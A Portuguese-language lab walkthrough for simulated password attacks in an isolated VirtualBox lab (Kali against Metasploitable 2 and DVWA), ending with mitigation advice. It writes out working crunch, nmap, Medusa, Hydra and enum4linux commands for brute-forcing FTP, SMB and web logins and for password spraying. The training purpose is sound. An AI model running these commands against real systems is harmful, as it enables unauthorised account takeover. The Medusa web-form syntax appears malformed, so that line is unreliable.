1. Configuração do Ambiente
Para garantir a segurança, todos os testes devem ser realizados em um ambiente isolado.

    Virtualização: Utilize o VirtualBox para hospedar duas máquinas virtuais (VMs).
    Atacante: Kali Linux.
    Alvos: Metasploitable 2 e a aplicação DVWA (Damn Vulnerable Web Application).
    Rede: Configure ambas as VMs no modo Rede Interna (Host-Only) para evitar exposição à internet e garantir que a comunicação ocorra apenas entre elas.

2. Preparação: Wordlists com Crunch
Antes de atacar, você precisará de listas de palavras (wordlists). Embora existam listas famosas como a rockyou.txt, criar uma wordlist personalizada pode ser mais eficaz para alvos específicos.

    Crunch: Use esta ferramenta no Kali para gerar combinações baseadas em padrões.
    Exemplo de Comando: Para gerar todas as senhas possíveis de 3 a 5 caracteres usando letras minúsculas: crunch 3 5 abcdefghijklmnopqrstuvwxyz -o wordlist.txt.
    Padrões: Se souber que uma senha segue um padrão (ex: letra maiúscula, letras minúsculas e um número), use: crunch 3 3 -t ,@@%.

3. Execução dos Ataques Simulados
A. Força Bruta em FTP (Porta 21)
O Medusa é ideal para este protocolo por ser multi-threaded e rápido.

    Enumeração inicial: Use o Nmap para confirmar se a porta 21 está aberta: nmap -sV -p 21 [IP_ALVO].
    Comando Medusa:
        Para um usuário específico: medusa -h [IP] -u msfadmin -P passwords.txt -M ftp.
        Para uma lista de usuários: medusa -h [IP] -U users.txt -P passwords.txt -M ftp.

B. Automação em Formulário Web (DVWA)
O DVWA possui diferentes níveis de segurança (Low, Medium, High, Impossible). No nível Low, não há proteções contra força bruta.

    Comando Medusa (HTTP Form): medusa -h [URL] -U usernames.txt -P passwords.txt -M http -m FORM:/login.php:username_field=password_field.
    Alternativa (Hydra): Para formulários POST complexos, o Hydra é frequentemente utilizado: hydra -l admin -P passwords.txt [IP] http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed".

C. SMB e Password Spraying (Porta 445)
O Password Spraying consiste em testar uma única senha comum contra vários usuários para evitar o bloqueio de contas.

    Enumeração de Usuários: Antes de atacar, identifique os usuários no SMB: enum4linux -U [IP].
    Comando Medusa: medusa -h [IP] -U users.txt -P passwords.txt -M smbnt.

4. Documentação e Mitigação
Sua documentação deve ser clara e profissional, incluindo os resultados (sucesso ou falha) e como prevenir tais ataques.

    Medidas de Mitigação Recomendadas:
        Uso de senhas fortes e únicas.
        Implementação de Autenticação de Dois Fatores (MFA).
        Políticas de bloqueio de conta após várias tentativas falhas.
        Monitoramento contínuo de logs e uso de sistemas IDS/IPS